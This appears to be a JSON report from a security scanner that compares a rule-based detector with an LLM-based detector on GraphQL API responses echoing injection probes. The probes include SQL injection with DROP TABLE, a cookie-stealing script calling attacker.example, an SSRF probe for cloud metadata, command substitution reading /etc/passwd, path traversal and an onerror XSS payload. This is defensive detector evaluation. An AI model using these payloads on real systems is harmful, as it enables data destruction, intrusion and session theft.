{
  "report_timestamp": "2025-10-05T21:43:29.362747",
  "api_url": "https://graphqlzero.almansi.me/api",
  "summary": {
    "total_comparisons": 10,
    "agreement_rate": 0.2,
    "simple_detections": 6,
    "llm_detections": 4,
    "consensus_breakdown": {
      "simple_only": 3,
      "both_detected": 3,
      "no_vulnerabilities": 3,
      "llm_only": 1
    },
    "detection_ratio": 0.6666666666666666,
    "potential_analysis": {
      "potential_agreement_rate": 0.0,
      "simple_potential_detections": 5,
      "llm_potential_detections": 1,
      "potential_consensus_breakdown": {
        "simple_potential_only": 5,
        "no_potential": 4,
        "llm_potential_only": 1
      },
      "potential_detection_ratio": 0.2
    }
  },
  "detailed_comparisons": [
    {
      "timestamp": "2025-10-05T21:42:01.460739",
      "node_name": "createComment_response_2",
      "response_status": 200,
      "response_body": {
        "data": {
          "createComment": {
            "id": "501",
            "name": "Robert'); DROP TABLE comments;--",
            "email": "sqlinjection@example.com",
            "body": "Attempt SQL injection via name field"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "SQL Injection (SQLi) Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "SQL injection vulnerability detected - malicious SQL patterns found in response",
            "evidence": "Response status: 200, SQL patterns detected in response"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [],
        "simple_unique_categories": [
          "Injection Attacks"
        ],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "simple_only",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:42:07.826153",
      "node_name": "createComment_response_3",
      "response_status": 200,
      "response_body": {
        "data": {
          "createComment": {
            "id": "501",
            "name": "XSS Tester",
            "email": "xss@example.com",
            "body": "<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>Attempt XSS"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Cross-Site Scripting (XSS) Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "XSS injection vulnerability detected - malicious script patterns found in response",
            "evidence": "Response status: 200, XSS patterns detected in response data"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: xss_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The GraphQL response contains an unescaped <script> element in the 'body' field returned by createComment. This indicates the server accepted and returned raw HTML/JavaScript content. If a client renders this 'body' value into the DOM without proper output encoding or sanitization, the embedded script would execute in the victim's browser and could exfiltrate cookies (as the payload itself attempts). Because the input appears to be stored and returned by createComment, this is indicative of a stored XSS risk (or reflected XSS depending on usage). Recommend treating the field as untrusted: apply output encoding/HTML-escaping before inserting into pages, perform input validation/sanitization, and deploy Content Security Policy (CSP) to mitigate script execution.",
            "evidence": "\"body\": \"<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>Attempt XSS\"",
            "confidence": 0.95,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "xss_injection",
              "severity": "HIGH",
              "confidence": 0.95,
              "evidence": "\"body\": \"<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>Attempt XSS\"",
              "explanation": "The GraphQL response contains an unescaped <script> element in the 'body' field returned by createComment. This indicates the server accepted and returned raw HTML/JavaScript content. If a client renders this 'body' value into the DOM without proper output encoding or sanitization, the embedded script would execute in the victim's browser and could exfiltrate cookies (as the payload itself attempts). Because the input appears to be stored and returned by createComment, this is indicative of a stored XSS risk (or reflected XSS depending on usage). Recommend treating the field as untrusted: apply output encoding/HTML-escaping before inserting into pages, perform input validation/sanitization, and deploy Content Security Policy (CSP) to mitigate script execution."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:42:16.812797",
      "node_name": "createComment_response_4",
      "response_status": 200,
      "response_body": {
        "data": {
          "createComment": {
            "id": "501",
            "name": "SSRF Probe",
            "email": "ssrf@example.com",
            "body": "Please fetch this URL: http://169.254.169.254/latest/meta-data/ to reveal instance metadata"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Server-Side Request Forgery (SSRF) Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "SSRF injection vulnerability detected - internal network access patterns found",
            "evidence": "Response status: 200, SSRF keywords detected in response"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [],
        "simple_unique_categories": [
          "Injection Attacks"
        ],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "simple_only",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:42:26.414066",
      "node_name": "createComment_response_5",
      "response_status": 200,
      "response_body": {
        "data": {
          "createComment": {
            "id": "501",
            "name": "Cmd Injection",
            "email": "oscmd@example.com",
            "body": "Injected command payload: $(cat /etc/passwd) || `ls -la /` ; echo done"
          }
        }
      },
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:42:34.450168",
      "node_name": "createComment_response_6",
      "response_status": 200,
      "response_body": {
        "data": {
          "createComment": {
            "id": "501",
            "name": "Path Traversal",
            "email": "path@example.com",
            "body": "../../../../../etc/passwd -- attempt path traversal in input"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Path Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "Path injection vulnerability detected - file system access patterns found",
            "evidence": "Response status: 200, Path injection patterns detected in response"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [],
        "simple_unique_categories": [
          "Injection Attacks"
        ],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "simple_only",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:42:52.168066",
      "node_name": "createComment_response_7",
      "response_status": 200,
      "response_body": {
        "data": {
          "createComment": {
            "id": "501",
            "name": "HTML Injector",
            "email": "html@example.com",
            "body": "<img src=\"x\" onerror=\"alert('injection')\">Injected HTML content"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "HTML Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "HTML injection vulnerability detected - HTML markup found in response",
            "evidence": "Response status: 200, HTML patterns detected in response data"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: html_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The GraphQL response returns raw HTML markup including an inline event handler: an <img> tag with an onerror attribute that triggers JavaScript. That indicates the API accepted and is reflecting/storing HTML content without sanitization or escaping. If a client renders this field into the DOM using innerHTML or otherwise injects it as HTML, the onerror handler will execute, producing a stored/reflected XSS (HTML injection) risk. The JSON encoding itself does not neutralize the HTML for client-side rendering. Recommended mitigations: sanitize or strip HTML on input or output, encode/escape HTML before inserting into pages (or use textContent), and apply appropriate Content Security Policy and output-encoding practices.",
            "evidence": "data.createComment.body = \"<img src=\\\"x\\\" onerror=\\\"alert('injection')\\\">Injected HTML content\"",
            "confidence": 0.9,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "html_injection",
              "severity": "HIGH",
              "confidence": 0.9,
              "evidence": "data.createComment.body = \"<img src=\\\"x\\\" onerror=\\\"alert('injection')\\\">Injected HTML content\"",
              "explanation": "The GraphQL response returns raw HTML markup including an inline event handler: an <img> tag with an onerror attribute that triggers JavaScript. That indicates the API accepted and is reflecting/storing HTML content without sanitization or escaping. If a client renders this field into the DOM using innerHTML or otherwise injects it as HTML, the onerror handler will execute, producing a stored/reflected XSS (HTML injection) risk. The JSON encoding itself does not neutralize the HTML for client-side rendering. Recommended mitigations: sanitize or strip HTML on input or output, encode/escape HTML before inserting into pages (or use textContent), and apply appropriate Content Security Policy and output-encoding practices."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:42:59.713985",
      "node_name": "createComment_response_8",
      "response_status": null,
      "response_body": null,
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:43:05.982772",
      "node_name": "createComment_response_9",
      "response_status": null,
      "response_body": null,
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:43:18.802853",
      "node_name": "createComment_response_10",
      "response_status": 400,
      "response_body": {
        "errors": [
          {
            "message": "Cannot query field \"createComment\" on type \"Query\". Did you mean \"comment\"?",
            "locations": [
              {
                "line": 3,
                "column": 3
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          }
        ]
      },
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: Introspection (Schema Exposure)",
            "detection": "safe",
            "category": "Injection Attacks",
            "description": "The GraphQL error response leaks schema information by suggesting an existing field name ('comment') when an invalid field ('createComment') was queried. This behavior discloses available field names and thus reveals parts of the GraphQL schema (schema exposure/introspection via error messages). While this is not a full introspection query response, it still provides sensitive information that can help an attacker craft targeted queries. Recommended mitigations: remove or sanitize detailed GraphQL validation errors in production, disable or restrict introspection queries where possible, and require authentication/authorization for schema access or error detail.",
            "evidence": "Error message: \"Cannot query field \\\"createComment\\\" on type \\\"Query\\\". Did you mean \\\"comment\\\"?\"",
            "confidence": 0.85,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "Introspection (Schema Exposure)",
              "severity": "LOW",
              "confidence": 0.85,
              "evidence": "Error message: \"Cannot query field \\\"createComment\\\" on type \\\"Query\\\". Did you mean \\\"comment\\\"?\"",
              "explanation": "The GraphQL error response leaks schema information by suggesting an existing field name ('comment') when an invalid field ('createComment') was queried. This behavior discloses available field names and thus reveals parts of the GraphQL schema (schema exposure/introspection via error messages). While this is not a full introspection query response, it still provides sensitive information that can help an attacker craft targeted queries. Recommended mitigations: remove or sanitize detailed GraphQL validation errors in production, disable or restrict introspection queries where possible, and require authentication/authorization for schema access or error detail."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 1,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [
          "Injection Attacks"
        ],
        "agreement_score": 0.0,
        "consensus": "llm_only",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:43:29.359386",
      "node_name": "createComment_response_11",
      "response_status": 400,
      "response_body": {
        "errors": [
          {
            "message": "Cannot query field \"createComment\" on type \"Query\". Did you mean \"comment\"?",
            "locations": [
              {
                "line": 3,
                "column": 3
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          }
        ]
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Field Suggestions Enabled",
            "detection": "vulnerable",
            "category": "Information Disclosure",
            "description": "Field suggestions enabled - potential information disclosure",
            "evidence": "Found \"did you mean\" in error message - field suggestions are enabled"
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Information Disclosure"
        ],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: field_suggestions",
            "detection": "potential",
            "category": "Unknown",
            "description": "The GraphQL error response includes a helpful suggestion ('Did you mean \"comment\"?') when an unknown field ('createComment') was queried. This behavior reveals schema information (available field names and types) which aids an attacker in enumerating the API schema and crafting targeted queries. While this is not direct data leakage like secrets or SQL errors, it is an information disclosure vulnerability (field suggestions) that increases the attack surface. Recommended mitigations: disable or remove suggestion text in error messages, return generic validation errors, or restrict error verbosity in production and require authenticated/introspected access for schema discovery.",
            "evidence": "errors[0].message: \"Cannot query field \\\"createComment\\\" on type \\\"Query\\\". Did you mean \\\"comment\\\"?\"",
            "confidence": 0.95,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "field_suggestions",
              "severity": "MEDIUM",
              "confidence": 0.95,
              "evidence": "errors[0].message: \"Cannot query field \\\"createComment\\\" on type \\\"Query\\\". Did you mean \\\"comment\\\"?\"",
              "explanation": "The GraphQL error response includes a helpful suggestion ('Did you mean \"comment\"?') when an unknown field ('createComment') was queried. This behavior reveals schema information (available field names and types) which aids an attacker in enumerating the API schema and crafting targeted queries. While this is not direct data leakage like secrets or SQL errors, it is an information disclosure vulnerability (field suggestions) that increases the attack surface. Recommended mitigations: disable or remove suggestion text in error messages, return generic validation errors, or restrict error verbosity in production and require authenticated/introspected access for schema discovery."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Unknown"
        ],
        "potential_categories": [
          "Unknown"
        ]
      },
      "comparison": {
        "total_categories": [
          "Information Disclosure",
          "Unknown"
        ],
        "common_categories": [],
        "simple_unique_categories": [
          "Information Disclosure"
        ],
        "llm_unique_categories": [
          "Unknown"
        ],
        "agreement_score": 0.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Unknown"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [
            "Unknown"
          ],
          "potential_agreement_score": 0.0,
          "potential_consensus": "llm_potential_only"
        }
      }
    }
  ],
  "detector_analysis": {
    "simple_detector": {
      "description": "Rule-based detector using predefined patterns",
      "strengths": [
        "Fast execution",
        "Consistent results",
        "Low resource usage"
      ],
      "weaknesses": [
        "Limited to known patterns",
        "May miss novel attacks",
        "False negatives possible"
      ]
    },
    "llm_detector": {
      "description": "AI-powered detector using language model analysis",
      "strengths": [
        "Contextual understanding",
        "Novel attack detection",
        "Detailed analysis"
      ],
      "weaknesses": [
        "Slower execution",
        "Resource intensive",
        "Potential false positives"
      ]
    }
  }
}